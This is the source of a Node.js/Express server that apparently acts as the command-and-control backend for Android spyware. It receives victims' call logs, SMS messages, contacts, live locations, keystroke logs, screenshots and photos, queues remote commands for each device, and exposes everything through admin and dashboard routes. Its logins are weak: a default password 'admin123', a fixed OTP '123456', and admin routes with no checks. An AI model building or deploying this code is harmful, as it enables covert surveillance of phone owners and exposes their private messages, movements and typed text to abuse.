const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const dotenv = require('dotenv');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');

dotenv.config();

const app = express();
const server = http.createServer(app);

// Socket.io
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// ========== MIDDLEWARE ==========
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Serve static frontend files
const frontendPath = path.join(__dirname, '../frontend');
console.log('📁 Serving static files from:', frontendPath);
app.use(express.static(frontendPath));

// ========== ENV CHECK ==========
console.log("\n📋 Render Deployment Check:");
console.log("🔑 MONGODB_URI:", process.env.MONGODB_URI ? "Loaded ✅" : "Missing ❌");
console.log("🌍 NODE_ENV:", process.env.NODE_ENV || "production");
console.log("🔌 PORT:", process.env.PORT || 5000);

// ========== DATABASE CONNECTION ==========
const mongoURI = process.env.MONGODB_URI;

if (!mongoURI) {
  console.error("❌ FATAL: MONGODB_URI not set in environment variables");
  console.error("Please add MONGODB_URI in Render Dashboard → Environment Variables");
}

mongoose.connect(mongoURI, {
  serverSelectionTimeoutMS: 15000,
  socketTimeoutMS: 45000,
})
.then(() => {
  console.log('✅ MongoDB Atlas connected successfully');
})
.catch(err => {
  console.error('❌ MongoDB Connection Error:', err.message);
  console.error('\n🔧 FIXES FOR RENDER:');
  console.error('   1. Go to MongoDB Atlas → Network Access');
  console.error('   2. Add IP: 0.0.0.0/0 (allow all)');
  console.error('   3. Check username/password in MONGODB_URI\n');
});

mongoose.connection.on('connected', () => {
  console.log('🟢 MongoDB connected');
});

mongoose.connection.on('error', (err) => {
  console.log('🔴 MongoDB error:', err.message);
});

// ========== MODELS ==========
const DeviceSchema = new mongoose.Schema({
  deviceId: { type: String, unique: true, required: true },
  deviceName: String,
  deviceModel: String,
  androidVersion: String,
  userId: String,
  battery: Number,
  networkStatus: String,
  lastSeen: { type: Date, default: Date.now },
  createdAt: { type: Date, default: Date.now }
});

const CallLogSchema = new mongoose.Schema({
  deviceId: String,
  phoneNumber: String,
  contactName: String,
  callType: String,
  duration: Number,
  timestamp: Number,
  createdAt: { type: Date, default: Date.now }
});

const SmsSchema = new mongoose.Schema({
  deviceId: String,
  contactNumber: String,
  message: String,
  timestamp: Number,
  isIncoming: Boolean,
  createdAt: { type: Date, default: Date.now }
});

const ContactSchema = new mongoose.Schema({
  deviceId: String,
  name: String,
  number: String,
  createdAt: { type: Date, default: Date.now }
});

const LocationSchema = new mongoose.Schema({
  deviceId: String,
  lat: Number,
  lng: Number,
  speed: Number,
  address: String,
  timestamp: { type: Date, default: Date.now }
});

const KeylogSchema = new mongoose.Schema({
  deviceId: String,
  appPackage: String,
  text: String,
  timestamp: { type: Date, default: Date.now }
});

const AppUsageSchema = new mongoose.Schema({
  deviceId: String,
  appPackage: String,
  appName: String,
  foregroundTime: Number,
  timestamp: Number,
  createdAt: { type: Date, default: Date.now }
});

const ScreenshotSchema = new mongoose.Schema({
  deviceId: String,
  imageBase64: String,
  timestamp: { type: Date, default: Date.now }
});

const PhotoSchema = new mongoose.Schema({
  deviceId: String,
  imageBase64: String,
  timestamp: { type: Date, default: Date.now }
});

const CommandSchema = new mongoose.Schema({
  deviceId: String,
  command: String,
  status: { type: String, default: 'pending' },
  createdAt: { type: Date, default: Date.now },
  executedAt: Date
});

const Device = mongoose.models.Device || mongoose.model('Device', DeviceSchema);
const CallLog = mongoose.models.CallLog || mongoose.model('CallLog', CallLogSchema);
const Sms = mongoose.models.Sms || mongoose.model('Sms', SmsSchema);
const Contact = mongoose.models.Contact || mongoose.model('Contact', ContactSchema);
const Location = mongoose.models.Location || mongoose.model('Location', LocationSchema);
const Keylog = mongoose.models.Keylog || mongoose.model('Keylog', KeylogSchema);
const AppUsage = mongoose.models.AppUsage || mongoose.model('AppUsage', AppUsageSchema);
const Screenshot = mongoose.models.Screenshot || mongoose.model('Screenshot', ScreenshotSchema);
const Photo = mongoose.models.Photo || mongoose.model('Photo', PhotoSchema);
const Command = mongoose.models.Command || mongoose.model('Command', CommandSchema);

// ========== API ROUTES ==========

// Health check
app.get('/api/health', (req, res) => {
  const dbStatus = mongoose.connection.readyState;
  const statusMap = { 0: 'disconnected', 1: 'connected', 2: 'connecting', 3: 'disconnecting' };
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    mongodb: statusMap[dbStatus] || 'unknown',
    server: 'render'
  });
});

// Register Device
app.post('/api/register', async (req, res) => {
  try {
    const { deviceId, deviceName, deviceModel, androidVersion, userId } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    
    let device = await Device.findOne({ deviceId });
    if (device) {
      device.deviceName = deviceName;
      device.deviceModel = deviceModel;
      device.androidVersion = androidVersion;
      device.userId = userId;
      device.lastSeen = new Date();
      await device.save();
    } else {
      device = new Device({ deviceId, deviceName, deviceModel, androidVersion, userId });
      await device.save();
    }
    console.log(`✅ Device registered: ${deviceId}`);
    res.json({ success: true, message: 'Device registered', deviceId });
  } catch (error) {
    console.error('Register error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Device Info
app.post('/api/device-info', async (req, res) => {
  try {
    const { deviceId, deviceName, deviceModel, androidVersion, battery, networkStatus } = req.body;
    await Device.findOneAndUpdate(
      { deviceId },
      { deviceName, deviceModel, androidVersion, battery, networkStatus, lastSeen: new Date() },
      { upsert: true }
    );
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get Command
app.get('/api/command/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const command = await Command.findOneAndUpdate(
      { deviceId, status: 'pending' },
      { status: 'sent' },
      { sort: { createdAt: 1 } }
    );
    if (command) {
      res.json({ command: command.command });
    } else {
      res.json({ command: 'none' });
    }
  } catch (error) {
    res.json({ command: 'none' });
  }
});

// Send Calls
app.post('/api/calls', async (req, res) => {
  try {
    const { deviceId, calls } = req.body;
    if (!calls || !Array.isArray(calls)) return res.status(400).json({ error: 'Invalid calls data' });
    for (const call of calls) {
      await CallLog.create({ deviceId, phoneNumber: call.phoneNumber, contactName: call.contactName, callType: call.callType, duration: call.duration, timestamp: call.timestamp });
    }
    res.json({ success: true, count: calls.length });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Send Messages
app.post('/api/messages', async (req, res) => {
  try {
    const { deviceId, messages } = req.body;
    if (!messages || !Array.isArray(messages)) return res.status(400).json({ error: 'Invalid messages data' });
    for (const msg of messages) {
      await Sms.create({ deviceId, contactNumber: msg.contactNumber, message: msg.message, timestamp: msg.timestamp, isIncoming: msg.isIncoming !== false });
    }
    res.json({ success: true, count: messages.length });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Send Contacts
app.post('/api/contacts', async (req, res) => {
  try {
    const { deviceId, contacts } = req.body;
    if (!contacts || !Array.isArray(contacts)) return res.status(400).json({ error: 'Invalid contacts data' });
    await Contact.deleteMany({ deviceId });
    for (const contact of contacts) {
      await Contact.create({ deviceId, name: contact.name, number: contact.number });
    }
    res.json({ success: true, count: contacts.length });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Send Location
app.post('/api/location', async (req, res) => {
  try {
    const { deviceId, lat, lng, speed, address } = req.body;
    await Location.create({ deviceId, lat, lng, speed: speed || 0, address: address || '' });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Send Keylog
app.post('/api/keylog', async (req, res) => {
  try {
    const { deviceId, appPackage, text } = req.body;
    await Keylog.create({ deviceId, appPackage, text: text?.substring(0, 1000) });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Send App Usage
app.post('/api/app-usage', async (req, res) => {
  try {
    const { deviceId, appPackage, appName, foregroundTime, timestamp } = req.body;
    await AppUsage.create({ deviceId, appPackage, appName, foregroundTime, timestamp });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Send Screenshot
app.post('/api/screenshot', async (req, res) => {
  try {
    const { deviceId, imageBase64 } = req.body;
    await Screenshot.create({ deviceId, imageBase64: imageBase64?.substring(0, 500000) });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Send Photo
app.post('/api/photo', async (req, res) => {
  try {
    const { deviceId, imageBase64 } = req.body;
    await Photo.create({ deviceId, imageBase64: imageBase64?.substring(0, 500000) });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Send Call Recording
app.post('/api/call-recording', async (req, res) => {
  try {
    const { deviceId, duration } = req.body;
    console.log(`🎙️ Call recording from ${deviceId}, duration: ${duration}s`);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Admin: Send Command
app.post('/api/admin/send-command', async (req, res) => {
  try {
    const { deviceId, command } = req.body;
    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
    await Command.create({ deviceId, command });
    res.json({ success: true, command });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Admin: Get All Devices
app.get('/api/admin/devices', async (req, res) => {
  try {
    const devices = await Device.find().sort({ lastSeen: -1 });
    res.json(devices);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Admin: Get Data
app.get('/api/admin/data/:deviceId/:type', async (req, res) => {
  try {
    const { deviceId, type } = req.params;
    const limit = parseInt(req.query.limit) || 100;
    let data = [];
    switch (type) {
      case 'calls': data = await CallLog.find({ deviceId }).sort({ timestamp: -1 }).limit(limit); break;
      case 'messages': data = await Sms.find({ deviceId }).sort({ timestamp: -1 }).limit(limit); break;
      case 'contacts': data = await Contact.find({ deviceId }); break;
      case 'locations': data = await Location.find({ deviceId }).sort({ timestamp: -1 }).limit(limit); break;
      case 'keylogs': data = await Keylog.find({ deviceId }).sort({ timestamp: -1 }).limit(limit); break;
      case 'appusage': data = await AppUsage.find({ deviceId }).sort({ timestamp: -1 }).limit(limit); break;
      case 'screenshots': data = await Screenshot.find({ deviceId }).sort({ timestamp: -1 }).limit(limit); break;
      case 'photos': data = await Photo.find({ deviceId }).sort({ timestamp: -1 }).limit(limit); break;
      default: return res.status(400).json({ error: 'Invalid type' });
    }
    res.json(data);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Data endpoints for dashboard
app.get('/api/data/stats', async (req, res) => {
  try {
    const totalDevices = await Device.countDocuments();
    const totalMessages = await Sms.countDocuments();
    const totalCalls = await CallLog.countDocuments();
    const totalLocations = await Location.countDocuments();
    const totalScreenshots = await Screenshot.countDocuments();
    res.json({ success: true, stats: { totalDevices, totalMessages, totalCalls, totalLocations, totalScreenshots } });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/recent', async (req, res) => {
  try {
    const calls = await CallLog.find().sort({ timestamp: -1 }).limit(10);
    const messages = await Sms.find().sort({ timestamp: -1 }).limit(10);
    const locations = await Location.find().sort({ timestamp: -1 }).limit(10);
    const keylogs = await Keylog.find().sort({ timestamp: -1 }).limit(10);
    const all = [...calls, ...messages, ...locations, ...keylogs];
    all.sort((a, b) => b.timestamp - a.timestamp);
    res.json({ success: true, data: all.slice(0, 20) });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/devices', async (req, res) => {
  try {
    const devices = await Device.find().sort({ lastSeen: -1 });
    res.json({ success: true, data: devices });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/calls', async (req, res) => {
  try {
    const calls = await CallLog.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: calls });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/messages', async (req, res) => {
  try {
    const messages = await Sms.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: messages });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/contacts', async (req, res) => {
  try {
    const contacts = await Contact.find();
    res.json({ success: true, data: contacts });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/locations', async (req, res) => {
  try {
    const locations = await Location.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: locations });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/keylogs', async (req, res) => {
  try {
    const keylogs = await Keylog.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: keylogs });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/screenshots', async (req, res) => {
  try {
    const screenshots = await Screenshot.find().sort({ timestamp: -1 }).limit(50);
    res.json({ success: true, data: screenshots });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/photos', async (req, res) => {
  try {
    const photos = await Photo.find().sort({ timestamp: -1 }).limit(10);
    res.json({ success: true, data: photos });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/app-usage', async (req, res) => {
  try {
    const usage = await AppUsage.find().sort({ timestamp: -1 }).limit(100);
    res.json({ success: true, data: usage });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get('/api/data/browser', async (req, res) => {
  res.json({ success: true, data: [] });
});

app.get('/api/data/keyword-alerts', async (req, res) => {
  res.json({ success: true, data: [] });
});

app.get('/api/data/geofence', async (req, res) => {
  res.json({ success: true, data: [] });
});

app.get('/api/data/call-recordings', async (req, res) => {
  res.json({ success: true, data: [] });
});

// Auth endpoints (simplified for demo)
app.post('/api/auth/verify-password', async (req, res) => {
  const { password } = req.body;
  const adminPassword = process.env.ADMIN_PASSWORD || 'admin123';
  if (password === adminPassword) {
    res.json({ success: true });
  } else {
    res.json({ success: false, message: 'Invalid password' });
  }
});

app.post('/api/auth/send-otp', async (req, res) => {
  res.json({ success: true, message: 'OTP sent (demo mode)' });
});

app.post('/api/auth/verify-otp', async (req, res) => {
  const { otp } = req.body;
  if (otp === '123456') {
    res.json({ success: true, token: 'demo-token-123', user: { name: 'Admin' } });
  } else {
    res.json({ success: false, message: 'Invalid OTP' });
  }
});

app.post('/api/auth/setup', async (req, res) => {
  res.json({ success: true, message: 'Setup complete' });
});

app.get('/api/auth/me', async (req, res) => {
  res.json({ success: true, user: { name: 'Admin' } });
});

app.post('/api/client/command', async (req, res) => {
  const { deviceId, command } = req.body;
  await Command.create({ deviceId, command });
  res.json({ success: true });
});

// Catch-all to serve index.html
app.get('*', (req, res) => {
  if (req.originalUrl.startsWith('/api')) {
    return res.status(404).json({ error: 'API endpoint not found' });
  }
  res.sendFile(path.join(frontendPath, 'index.html'));
});

// Socket.io
io.on('connection', (socket) => {
  console.log('🔌 Client connected:', socket.id);
  socket.on('disconnect', () => {
    console.log('❌ Client disconnected:', socket.id);
  });
});

// Start server
const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 Render Server running on port ${PORT}`);
  console.log(`📡 API URL: https://gauravhanna-spy.onrender.com/api`);
  console.log(`💡 Health Check: https://gauravhanna-spy.onrender.com/api/health\n`);
});